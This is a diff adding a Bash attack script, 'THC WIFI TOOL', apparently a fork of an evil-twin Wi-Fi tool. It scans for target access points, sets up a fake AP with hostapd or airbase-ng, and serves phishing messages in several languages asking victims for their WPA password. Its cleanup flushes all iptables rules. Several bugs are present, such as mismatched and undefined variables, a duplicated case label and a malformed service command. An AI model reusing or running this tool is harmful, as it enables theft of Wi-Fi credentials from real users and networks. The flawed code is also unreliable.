@@ -1,0 +1,1922 @@
+#!/bin/bash
+
+########## Modo DEBUG ##########
+##			      ##
+        THC_DEBUG=0
+##			      ##
+################################
+
+##################################### < SCRIPT > #####################################
+
+# Ruta de almacenamiento de datos
+DUMP_PATH="/tmp/TMPthc"
+# Número de reprovações
+DEAUTHTIME="8"
+# Numero de revisão
+revision=38
+# Numero de versao
+version=0.4.2.0-1
+# Faixa de IP a ser usada no DHCP
+IP=192.168.1.1
+# Criar variável de uma rede do gateway
+RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
+
+#Cores
+branco="\033[1;37m"
+cinza="\033[0;37m"
+magenta="\033[0;35m"
+vermelho="\033[1;31m"
+verde="\033[1;32m"
+amarelo="\033[1;33m"
+azul="\033[1;34m"
+rescolor="\e[0m"
+
+
+# Ajustar o script no modo normal ou desenvolvedor
+if [ $THC_DEBUG = 1 ]; then
+	## definido como / dev / stdout quando no modo de desenvolvedor/depurador
+	export linset_output_device=/dev/stdout
+	HOLD="-hold"
+else
+	## definido como /dev/null quando no modo de produção
+	export linset_output_device=/dev/null
+	HOLD=""
+fi
+
+# Torna claro se o modo é normal
+function conditional_clear() {
+	
+	if [[ "$linset_output_device" != "/dev/stdout" ]]; then clear; fi
+}
+
+# Animação Spinner
+function spinner {
+	
+	local pid=$1
+	local delay=0.15
+	local spinstr='|/-\'
+		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+			local temp=${spinstr#?}
+			printf " [%c]  " "$spinstr"
+			local spinstr=$temp${spinstr%"$temp"}
+			sleep $delay
+			printf "\b\b\b\b\b\b"
+		done
+	printf "    \b\b\b\b"
+}
+
+# Se um erro for recebido, exiba a linha enquanto estiver no modo DEBUG
+if [ "$THC_DEBUG" = "0" ]; then
+	trap 'err_report $LINENO' ERR
+fi
+
+# Comunicar o penhor onde o erro está localizado
+function err_report {
+	echo "Erro na LINHA $1"
+}
+
+
+# Se o script for fechado inesperadamente, execute a função
+trap exitmode SIGINT SIGHUP
+
+# Função que limpa as interfaces e sai
+function exitmode {
+	
+	echo -e "\n\n"$branco"["$vermelho" "$branco"] "$vermelho"Executando limpeza e saindo."$rescolor""
+	
+	if ps -A | grep -q aireplay-ng; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"aireplay-ng"$rescolor""
+		killall aireplay-ng &>$linset_output_device
+	fi
+	
+	if ps -A | grep -q airodump-ng; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"airodump-ng"$rescolor""
+		killall airodump-ng &>$linset_output_device
+	fi
+	
+	if ps a | grep python| grep fakedns; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"python"$rescolor""
+		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$linset_output_device
+	fi
+	
+	if ps -A | grep -q hostapd; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"hostapd"$rescolor""
+		killall hostapd &>$linset_output_device
+	fi
+	 
+	if ps -A | grep -q lighttpd; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"lighttpd"$rescolor""
+		killall lighttpd &>$linset_output_device
+	fi
+	 
+	if ps -A | grep -q dhcpd; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"dhcpd"$rescolor""
+		killall dhcpd &>$linset_output_device
+	fi
+	
+	if ps -A | grep -q mdk3; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Kill "$gris"mdk3"$rescolor""
+		killall mdk3 &>$linset_output_device
+	fi
+	
+	if [ "$WIFI_MONITOR" != "" ]; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Parando interface "$verde"$WIFI_MONITOR"$rescolor""
+		airmon-ng stop $WIFI_MONITOR &> $linset_output_device
+	fi
+	
+	if [ "$WIFI" != "" ]; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Parando interface "$verde"$WIFI"$rescolor""
+		airmon-ng stop $WIFI &> $linset_output_device
+	fi
+	
+	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Restaurando "$gris"ipforwarding"$rescolor""
+		echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
+	fi
+	
+	echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Limpando "$gris"iptables"$rescolor""
+	iptables --flush
+	iptables --table nat --flush
+	iptables --delete-chain
+	iptables --table nat --delete-chain
+	
+	echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Restaurando "$gris"tput"$rescolor""
+	tput cnorm
+	
+	if [ $THC_DEBUG != 1 ]; then
+		
+		echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Eliminando "$gris"arquivos"$rescolor""
+		rm -R $DUMP_PATH/* &>$linset_output_device
+	fi
+	
+	echo -e ""$branco"["$vermelho"-"$branco"] "$branco"Reiniciando "$gris"NetworkManager"$rescolor""
+	service restart networkmanager &> $linset_output_device &
+	
+	echo -e ""$branco"["$verde"+"$branco"] "$verde"Limpeza efetuada com Sucesso!"$rescolor""
+	exit
+	
+}
+
+# Gere uma lista de interfaces no script
+readarray -t webinterfaces < <(echo -e "Interface web neutra
+\e[1;31mSalir"$rescolor""
+)
+
+# Gera lista de idiomas da web
+readarray -t webinterfaceslenguage < <(echo -e "Ingles [ENG]
+Espanhol[ESP]
+\e[1;31mAtras"$rescolor""
+)
+
+#Mensajes de interfaces web Ingles
+DIALOG_WEB_INFO_ENG="For security reasons, enter the <b>"$Host_ENC"</b> key to access the Internet"
+DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
+DIALOG_WEB_SUBMIT_ENG="Submit"
+DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
+DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
+DIALOG_WEB_BACK_ENG="Back"
+DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters"
+DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters"
+
+#Mensajes de interfaces web Español
+DIALOG_WEB_INFO_ESP="Por razones de seguridad, introduzca la contrase&ntilde;a <b>"$Host_ENC"</b> para acceder a Internet"
+DIALOG_WEB_INPUT_ESP="Introduzca su contrase&ntilde;a WPA:"
+DIALOG_WEB_SUBMIT_ESP="Enviar"
+DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b>"
+DIALOG_WEB_OK_ESP="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
+DIALOG_WEB_BACK_ESP="Atr&aacute;s"
+DIALOG_WEB_LENGHT_MIN_ESP="La clave debe ser superior a 7 caracteres"
+DIALOG_WEB_LENGHT_MAX_ESP="La clave debe ser inferior a 64 caracteres"
+
+#Mensajes de interfaces web Italiano
+DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave <b>"$Host_ENC"</b> per accedere a Internet"
+DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
+DIALOG_WEB_SUBMIT_IT="Invia"
+DIALOG_WEB_ERROR_IT="<b><font color=\"red\" size=\"3\">Errore</font>:</b> La password <b>NON</b> &egrave; corretta!</b>"
+DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
+DIALOG_WEB_BACK_IT="Indietro"
+DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
+DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"
+
+#Mensajes de interfaces web Frances
+DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
+DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
+DIALOG_WEB_SUBMIT_FR="Valider"
+DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
+DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
+DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
+DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
+DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"
+
+#Mensajes de interfaces web Portugues
+DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
+DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
+DIALOG_WEB_SUBMIT_POR="Enviar"
+DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
+DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
+DIALOG_WEB_BACK_POR="Voltar"
+DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
+DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
+
+# Mostrar a mensagem principal do script
+function mostrarheader(){
+
+	echo ""
+	sleep 0.1 && echo -e "$verde ██╗    ██╗$rescolor██╗███████╗██╗    ████████╗$verde██████╗  ██████╗  $rescolor██╗     "
+	sleep 0.1 && echo -e "$verde ██║    ██║$rescolor██║██╔════╝██║    ╚══██╔══╝$verde██╔═══██╗██╔═══██╗$rescolor██║     "
+	sleep 0.1 && echo -e "$verde ██║ █╗ ██║$rescolor██║█████╗  ██║       ██║   $verde██║   ██║██║   ██║$rescolor██║     "
+	sleep 0.1 && echo -e "$verde ██║███╗██║$rescolor██║██╔══╝  ██║       ██║   $verde██║   ██║██║   ██║$rescolor██║     "
+	sleep 0.1 && echo -e "$verde ╚███╔███╔╝$rescolor██║██║     ██║       ██║   $verde╚██████╔╝╚██████╔╝$rescolor███████╗"
+	sleep 0.1 && echo -e "$verde  ╚══╝╚══╝ $rescolor╚═╝╚═╝     ╚═╝       ╚═╝   $verde ╚═════╝  ╚═════╝ $rescolor╚══════╝"
+	echo -e "$azul 						⊲ Ⓥ  ₀.₄.₂.₀﹣₁ ⊳ "							
+      	sleep 2
+	echo -e " "
+	echo -e "$verde  ╔╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╧╗"
+	echo -e "$verde  ╣                                                        ╠"
+	echo -e "$verde  ╣$azul     THC WIFI TOOL $vermelho $version" "${azul}by ""${vermelho}Ravok THC""$verde              ╠"
+	echo -e "$verde  ╣""${verde}	 	   � github.com/RavokTHC � $verde                ╠"
+	echo -e "$verde  ╣                                                        ╠"
+	echo -e "$verde  ╚╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╝""$rescolor"
+	echo
+	echo
+
+
+	echo
+	echo
+}
+
+############################################## < INICIO > ##############################################
+
+
+if ! [ $(id -u) = "0" ] 2>/dev/null; then
+	echo -e "\e[1;31mVocê não tem privilégios de administrador"$rescolor""
+	exit
+fi
+
+# Comprueba la existencia de todas las dependencias
+function checkdependences {
+	
+	echo -ne "Aircrack-ng....."
+	if ! hash aircrack-ng 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Aireplay-ng....."
+	if ! hash aireplay-ng 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Airmon-ng......."
+	if ! hash airmon-ng 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Airodump-ng....."
+	if ! hash airodump-ng 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Awk............."
+	if ! hash awk 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Curl............"
+	if ! hash curl 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Dhcpd..........."
+	if ! hash dhcpd 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor" (isc-dhcp-server)"
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Hostapd........."
+	if ! hash hostapd 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Iwconfig........"
+	if ! hash iwconfig 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Lighttpd........"
+	if ! hash lighttpd 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Macchanger......"
+	if ! hash macchanger 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+	    echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Mdk3............"
+	if ! hash mdk3 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Nmap............"
+	if ! [ -f /usr/bin/nmap ]; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Php5-cgi........"
+	if ! [ -f /usr/bin/php-cgi ]; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Pyrit..........."
+	if ! hash pyrit 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Python.........."
+	if ! hash python 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Unzip..........."
+	if ! hash unzip 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	echo -ne "Xterm..........."
+	if ! hash xterm 2>/dev/null; then
+		echo -e "\e[1;31m☢ Nao Instalado ☢"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32m⊲OK!⊳"$rescolor""
+	fi
+	sleep 0.025
+	
+	if [ "$sair" = "1" ]; then
+	exit 1
+	fi
+	
+	sleep 1
+	clear
+}
+mostrarheader
+checkdependences
+
+# Criar pasta de trabalho
+if [ ! -d $DUMP_PATH ]; then
+	mkdir $DUMP_PATH &>$linset_output_device
+fi
+
+# Introdução do roteiro
+if [ $THC_DEBUG != 1 ]; then
+	
+	echo "" 
+
+fi
+
+# Mostrar informações do AP selecionado
+function infoap {
+	
+	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
+	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
+	echo "INFO AP OBJETIVO"
+	echo
+	echo -e "                     "$verde"SSID"$rescolor" = $Host_SSID / $Host_ENC"
+	echo -e "                    "$verde"Canal"$rescolor" = $channel"
+	echo -e "                "$verde"Velocidade"$rescolor" = ${speed:2} Mbps"
+	echo -e "               "$verde"MAC AP"$rescolor" = $mac (\e[1;33m$Host_MAC_MODEL"$rescolor")"
+	echo
+}
+
+############################################## < INICIO > ##############################################
+
+
+
+
+
+
+############################################### < MENU > ###############################################
+
+# A resolução ótima do nosso equipamento é detectada
+function setresolution {
+
+	function resA {
+		# Upper left window +0+0 (size*size+position+position)
+		TOPLEFT="-geometry 90x13+0+0"
+		# Upper right window -0+0
+		TOPRIGHT="-geometry 83x26-0+0"
+		# Bottom left window +0-0
+		BOTTOMLEFT="-geometry 90x24+0-0"
+		# Bottom right window -0-0
+		BOTTOMRIGHT="-geometry 75x12-0-0"
+		TOPLEFTBIG="-geometry 91x42+0+0"
+		TOPRIGHTBIG="-geometry 83x26-0+0"
+	}
+	
+	function resB {
+		# Upper left window +0+0 (size*size+position+position)
+		TOPLEFT="-geometry 92x14+0+0"
+		# Upper right window -0+0
+		TOPRIGHT="-geometry 68x25-0+0"
+		# Bottom left window +0-0
+		BOTTOMLEFT="-geometry 92x36+0-0"
+		# Bottom right window -0-0
+		BOTTOMRIGHT="-geometry 74x20-0-0"
+		TOPLEFTBIG="-geometry 100x52+0+0"
+		TOPRIGHTBIG="-geometry 74x30-0+0"
+	}
+	function resC {
+		# Upper left window +0+0 (size*size+position+position)
+		TOPLEFT="-geometry 100x20+0+0"
+		# Upper right window -0+0
+		TOPRIGHT="-geometry 109x20-0+0"
+		# Bottom left window +0-0
+		BOTTOMLEFT="-geometry 100x30+0-0"
+		# Bottom right window -0-0
+		BOTTOMRIGHT="-geometry 109x20-0-0"
+		TOPLEFTBIG="-geometry  100x52+0+0"
+		TOPRIGHTBIG="-geometry 109x30-0+0"
+	}
+	function resD {
+		# Upper left window +0+0 (size*size+position+position)
+		TOPLEFT="-geometry 110x35+0+0"
+		# Upper right window -0+0
+		TOPRIGHT="-geometry 99x40-0+0"
+		# Bottom left window +0-0
+		BOTTOMLEFT="-geometry 110x35+0-0"
+		# Bottom right window -0-0
+		BOTTOMRIGHT="-geometry 99x30-0-0"
+		TOPLEFTBIG="-geometry 110x72+0+0"
+		TOPRIGHTBIG="-geometry 99x40-0+0"
+	}
+	function resE {
+		# Upper left window +0+0 (size*size+position+position)
+		TOPLEFT="-geometry 130x43+0+0"
+		# Upper right window -0+0
+		TOPRIGHT="-geometry 68x25-0+0"
+		# Bottom left window +0-0
+		BOTTOMLEFT="-geometry 130x40+0-0"
+		BOTTOMRIGHT="-geometry 132x35-0-0"
+		TOPLEFTBIG="-geometry 130x85+0+0"
+		TOPRIGHTBIG="-geometry 132x48-0+0"
+	}
+	function resF {
+		# Upper left window +0+0 (size*size+position+position)
+		TOPLEFT="-geometry 100x17+0+0" # capturando dados da vitima ... (JANELA ATAQUE DO AIRODUMP)
+		# Upper right window -0+0
+		TOPRIGHT="-geometry 90x27-0+0" # desautenticando
+		# Bottom left window +0-0
+		BOTTOMLEFT="-geometry 100x30+0-0" # aireplay, CHOPCHOP, FRAGMENTACION ... (JANELA SOB CAPTURAS DE AIRODUMP)
+		# Bottom right window -0-0
+		BOTTOMRIGHT="-geometry 90x20-0-0" # ASSOCIANDO COM ... (JANELA VERMELHA)
+		TOPLEFTBIG="-geometry  100x70+0+0" # alvos de varredura ... (DIGITALIZAÇÃO INICIAL)
+		TOPRIGHTBIG="-geometry 90x27-0+0"  # AIRCRACK ... (BUSCA DE CHAVES) 
+}
+
+detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
+##  A) 1024x600
+##  B) 1024x768
+##  C) 1280x768
+##  D) 1280x1024
+##  E) 1600x1200
+case $detectedresolution in
+	"1024x600" ) resA ;;
+	"1024x768" ) resB ;;
+	"1280x768" ) resC ;;
+	"1366x768" ) resC ;;
+	"1280x1024" ) resD ;;
+	"1600x1200" ) resE ;;
+	"1366x768"  ) resF ;;
+		  * ) resA ;; ## fallback para uma opção segura
+esac
+}
+
+# Escolha as interfaces para usar
+function setinterface {
+	
+	# Pegue todas as interfaces no modo monitor para pará-las
+	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
+	
+	for monkill in ${KILLMONITOR[@]}; do
+		airmon-ng stop $monkill >$linset_output_device
+		echo -n "$monkill, "
+	done
+	
+	# Crie uma variável com a lista de interfaces de rede física
+	readarray -t wirelessifaces < <(airmon-ng |grep "-" | cut -d- -f1)
+	INTERFACESNUMBER=`airmon-ng| grep -c "-"`
+	
+	echo
+	echo
+	echo Autodetectando resolução ...
+	echo $resolução detectada
+	echo
+	
+	
+	# Se houver apenas 1 placa sem fio
+	if [ "$INTERFACESNUMBER" -gt "0" ]; then
+		
+		echo "Selecione uma interface:"
+		echo
+		i=0
+		
+		for line in "${wirelessifaces[@]}"; do
+			i=$(($i+1))
+			wirelessifaces[$i]=$line
+			echo -e "$verde""$i)"$rescolor" $line"
+		done
+		
+		echo -n "#? "
+		read line
+		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
+		
+		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
+			conditional_clear
+			mostrarheader
+			setinterface
+		fi
+		
+		readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
+		WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{print($(NF-2))}')
+		rmmod -f "$WIFIDRIVER" &>$linset_output_device 2>&1
+		
+		for molesto in "${softwaremolesto[@]}"; do
+			killall "$molesto" &>$linset_output_device
+		done
+		sleep 0.5
+		
+		modprobe "$WIFIDRIVER" &>$linset_output_device 2>&1
+		sleep 0.5
+		# Selecione uma interface
+		select PREWIFI in $INTERFACES; do
+			break;
+		done
+		
+		WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
+		WIFI_MONITOR=$WIFIMONITOR
+		# Definir uma variável para a interface física
+		  WIFI=$PREWIFI
+		# Fechar se não detectar nada
+	else
+		
+		echo Nenhuma placa sem fio encontrado. Fechando ...
+		sleep 5
+		exitmode
+	fi
+	
+	vk496
+	
+}
+
+# Intermediário que comprova a validade da eleição e prepara o ambiente
+function vk496 {
+	
+	conditional_clear
+	CSVDB=dump-01.csv
+	
+	rm -rf $DUMP_PATH/*
+	
+	choosescan
+	selection
+}
+
+# Escolha se você deseja verificar todos os canais ou um canal específico
+function choosescan {
+	
+	conditional_clear
+	
+	while true; do
+		conditional_clear
+		mostrarheader
+		
+		echo "SELECIONAR CANAL"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" Todos os canais             "
+		echo -e "      "$verde"2)"$rescolor" Canal(ais) específico(s)       "
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) Scan ; break ;;
+			2 ) Scanchan ; break ;;  
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		  esac
+	done
+}
+
+# Escolha o canal/digitalização, se você escolheu essa opção
+function Scanchan {
+	  
+	conditional_clear
+	mostrarheader
+	
+	  echo "                                       "
+	  echo "      Selecione o canal de pesquisa     "
+	  echo "                                       "
+	  echo -e "     Um canal     "$verde"6"$rescolor"               "
+	  echo -e "     2+ canais  "$verde"1-5"$rescolor"             "
+	  echo -e "     Multiplos canais "$verde"1,2,5-7,11"$rescolor"      "
+	  echo "                                       "
+	echo -n "      #> "
+	read channel_number
+	set -- ${channel_number}
+	conditional_clear
+	
+	rm -rf $DUMP_PATH/dump*
+	xterm $HOLD -title "Escaneando Alvos no Canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
+}
+
+# Escanear toda a rede
+function Scan {
+	
+	conditional_clear
+	xterm $HOLD -title "Escaneando Alvos ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
+}
+
+# Escolha uma rede de todas as escaneadas
+function selection {
+	
+	conditional_clear
+	mostrarheader
+	
+	
+	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
+	
+	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
+		vk496 && break
+	fi
+	
+	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	linap=`expr $linap - 1`
+	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
+	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
+	echo "                         Lista de Alvos [AP] "
+	echo ""
+	echo " #      MAC                      CANAL    SECUR     PWR    ESSID"
+	echo ""
+	i=0
+	
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
+		longueur=${#MAC}
+		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
+		PRIVACY=${PRIVACY:0:4}
+		if [ $longueur -ge 17 ]; then
+			i=$(($i+1))
+			POWER=`expr $POWER + 100`
+			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
+			
+			if [ "$CLIENTE" != "" ]; then
+				CLIENTE="*" 
+			fi
+			
+			echo -e " ""$verde"$i")"$branco"$CLIENTE\t""$amarelo"$MAC"\t""$verde"$CHANNEL"\t""$vermelho" $PRIVACY"\t  ""$amarelo"$POWER%"\t""$verde"$ESSID""$rescolor""
+			aidlenght=$IDLENGTH
+			assid[$i]=$ESSID
+			achannel[$i]=$CHANNEL
+			amac[$i]=$MAC
+			aprivacy[$i]=$PRIVACY
+			aspeed[$i]=$SPEED
+		fi
+	done < $DUMP_PATH/dump-02.csv
+	echo
+	echo -e ""$verde"("$branco"*"$verde") Rede com Clientes "$rescolor""
+	echo ""
+	echo "        Selecionar Alvo               "
+	echo -n "      #> "
+	read choice
+	idlenght=${aidlenght[$choice]}
+	ssid=${assid[$choice]}
+	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
+	mac=${amac[$choice]}
+	privacy=${aprivacy[$choice]}
+	speed=${aspeed[$choice]}
+	Host_IDL=$idlength
+	Host_SPEED=$speed
+	Host_ENC=$privacy
+	Host_MAC=$mac
+	Host_CHAN=$channel
+	acouper=${#ssid}
+	fin=$(($acouper-idlength))
+	Host_SSID=${ssid:1:fin}
+	
+	conditional_clear
+	
+	askAP
+}
+
+# Escolha o modo FakeAP
+function askAP {
+		
+	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
+	
+	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
+		selection && break
+	fi
+	
+	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
+		fakeapmode="airbase-ng"
+		askauth
+	fi
+	
+	mostrarheader
+	while true; do
+		
+		infoap
+		
+		echo "MODO DE FakeAP"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" ◈ Hostapd"
+		echo -e "      "$verde"2)"$rescolor" ◈ Airbase-ng"
+		echo -e "      "$verde"3)"$rescolor" ◈ Voltar"
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
+			2 ) fakeapmode="airbase-ng"; askauth; break ;;
+			3 ) selection; break ;;
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		esac
+	done 
+	
+} 
+
+# Método de verificação de PASSA se você escolheu a base aérea-ng
+function askauth {
+	
+	conditional_clear
+	
+	mostrarheader
+	while true; do
+		
+		echo "MÉTODO DE VERIFICAÇÃO DE PSWRD"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" ◈ Handshake"
+		echo -e "      "$verde"2)"$rescolor" ◈ Wpa_supplicant"
+		echo -e "      "$verde"3)"$rescolor" ◈ Voltar"
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) authmode="handshake"; handshakelocation; break ;;
+			2 ) authmode="wpa_supplicant"; webinterface; break ;;
+			3 ) askAP; break ;;
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		esac
+	done 
+	
+} 
+
+function handshakelocation {
+	
+	conditional_clear
+	
+	mostrarheader
+	infoap
+	echo
+	echo -e "Digite a rota do handshake que você deseja auditar (Ex: $vermelho/root/HANDSHAKE.cap$rescolor)"
